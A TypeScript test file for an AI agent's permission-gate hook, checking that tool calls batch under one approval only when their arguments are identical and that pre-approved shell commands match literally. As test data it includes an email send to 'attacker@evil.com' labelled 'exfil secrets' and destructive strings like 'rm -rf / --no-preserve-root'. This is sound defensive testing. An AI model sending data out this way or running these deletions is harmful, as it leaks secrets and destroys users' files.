import { test, expect } from "bun:test";
import { EventEmitter } from "node:events";
import { Text, useInput } from "ink";
import { render } from "ink-testing-library";
import type { ReactNode } from "react";
import { useGates } from "../../../src/tui/hooks/use-gates.js";
import { matchesPattern } from "../../../src/permission/matcher.js";
import { preApproveExactShellCommands } from "../../../src/permission/command.js";

// Stable across renders: the gate-listener effect re-registers (and its
// cleanup denies the queue) whenever setGatePending changes identity.
const noopGatePending = (): void => {};

function Harness({ emitter }: { emitter: EventEmitter }): ReactNode {
  const gates = useGates({ eventEmitter: emitter, setGatePending: noopGatePending });
  useInput((input) => {
    if (input === "p") gates.resolvePermission({ allow: true });
  });
  const perm = gates.pendingPermission === null ? "none" : `perm:${gates.pendingPermission.subject}`;
  return <Text>{`${perm} batch=${gates.permissionBatchSize}`}</Text>;
}

const tick = () => new Promise((resolve) => setTimeout(resolve, 20));

// Generic (non-shell, non-file) tools use the tool name as subject, so batch
// identity must also compare arguments — otherwise two calls with completely
// different payloads collapse into one approval and the operator only reads
// the head's arguments.
test("same-tool different-arguments MCP calls each get their own prompt", async () => {
  const emitter = new EventEmitter();
  const outcomes: Array<{ body: string; allow: boolean }> = [];
  const { lastFrame, stdin } = render(<Harness emitter={emitter} />);
  await tick();

  emitter.emit("permission.gate", {
    request: {
      tool: "mcp__mail__send_email", action: "Run MCP tool", subject: "mcp__mail__send_email",
      arguments: { to: "boss@corp.com", body: "weekly report" }, scopes: [],
    },
    resolve: (o: { allow: boolean }) => { outcomes.push({ body: "weekly report", allow: o.allow }); },
  });
  emitter.emit("permission.gate", {
    request: {
      tool: "mcp__mail__send_email", action: "Run MCP tool", subject: "mcp__mail__send_email",
      arguments: { to: "attacker@evil.com", body: "exfil secrets" }, scopes: [],
    },
    resolve: (o: { allow: boolean }) => { outcomes.push({ body: "exfil secrets", allow: o.allow }); },
  });
  await tick();

  // Different arguments: no batching, one decision covers only the head.
  expect(lastFrame()).toContain("batch=1");
  stdin.write("p");
  await tick();

  expect(outcomes).toEqual([{ body: "weekly report", allow: true }]);
  // The unseen-argument call is still queued for its own prompt.
  expect(lastFrame()).toContain("perm:mcp__mail__send_email");
  stdin.write("p");
  await tick();
  expect(outcomes).toEqual([
    { body: "weekly report", allow: true },
    { body: "exfil secrets", allow: true },
  ]);
});

// write_file subjects carry only the path; differing content must not batch.
test("write_file calls to the same path with different content prompt separately", async () => {
  const emitter = new EventEmitter();
  const outcomes: string[] = [];
  const { lastFrame, stdin } = render(<Harness emitter={emitter} />);
  await tick();

  emitter.emit("permission.gate", {
    request: { tool: "write_file", action: "Write file", subject: "/repo/a.txt", arguments: { path: "/repo/a.txt", content: "benign" }, scopes: [] },
    resolve: () => { outcomes.push("benign"); },
  });
  emitter.emit("permission.gate", {
    request: { tool: "write_file", action: "Write file", subject: "/repo/a.txt", arguments: { path: "/repo/a.txt", content: "malicious overwrite" }, scopes: [] },
    resolve: () => { outcomes.push("malicious overwrite"); },
  });
  await tick();
  expect(lastFrame()).toContain("batch=1");
  stdin.write("p");
  await tick();
  expect(outcomes).toEqual(["benign"]);
  stdin.write("p");
  await tick();
  expect(outcomes).toEqual(["benign", "malicious overwrite"]);
});

// Truly identical write_file calls still batch under one decision.
test("identical write_file calls batch under one decision", async () => {
  const emitter = new EventEmitter();
  const outcomes: string[] = [];
  const { lastFrame, stdin } = render(<Harness emitter={emitter} />);
  await tick();

  const request = {
    tool: "write_file", action: "Write file", subject: "/repo/a.txt",
    arguments: { path: "/repo/a.txt", content: "same" }, scopes: [],
  };
  emitter.emit("permission.gate", { request, resolve: () => { outcomes.push("first"); } });
  emitter.emit("permission.gate", { request: { ...request }, resolve: () => { outcomes.push("second"); } });
  await tick();
  expect(lastFrame()).toContain("batch=2");
  stdin.write("p");
  await tick();
  expect(outcomes).toEqual(["first", "second"]);
});

// A declared command is stored as a pattern matched by globToRegExp, so its
// glob metacharacters must be escaped: the grant covers the literal string the
// operator read, never a wildcard family.
test("declared command containing * grants only the literal string", () => {
  const patterns: string[] = [];
  preApproveExactShellCommands((_tool, pattern) => patterns.push(pattern), ["rm *.tmp"]);
  expect(patterns).toHaveLength(1);
  const pattern = patterns[0]!;
  expect(matchesPattern("rm *.tmp", pattern)).toBe(true);
  expect(matchesPattern("rm -rf /Users/me/important.tmp", pattern)).toBe(false);
  expect(matchesPattern("rm -rf / --no-preserve-root #.tmp", pattern)).toBe(false);
});
